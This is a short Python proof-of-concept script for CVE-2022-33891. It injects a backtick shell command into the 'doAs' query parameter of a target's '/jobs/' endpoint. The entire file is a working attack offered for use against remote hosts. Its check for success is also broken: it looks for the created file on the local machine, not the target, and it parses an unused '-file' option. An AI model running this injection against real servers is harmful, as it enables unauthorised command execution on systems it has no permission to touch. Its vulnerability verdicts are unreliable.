import requests
import argparse
import os

def exploit(url):
    url = "http://"+url+"/jobs/?doAs=`touch%20/wavesky.txt`"
    response = requests.get(url=url)
    if(response.status_code == 403):
        if(os.access("/wavesky.txt",os.F_OK)):
            print("It looks likely vulnerable")
            os.system('ls /')
            # If you don't want to save this file,please delete '#' in nextline
            # os.system('rm -rf /wavesky.txt') 

        else:
            print("It is strong")
    else:
        print("It is strong")


if __name__ == '__main__':
    parameter = argparse.ArgumentParser(description='Poc CVE-2022-33891:')
    parameter.add_argument('-file',help='url file',required=False)
    parameter.add_argument('-url',help='ip:port',required=False)
    para = parameter.parse_args()

    if para.url:
        exploit(para.url)
        exit()
    else:
        parameter.print_help()
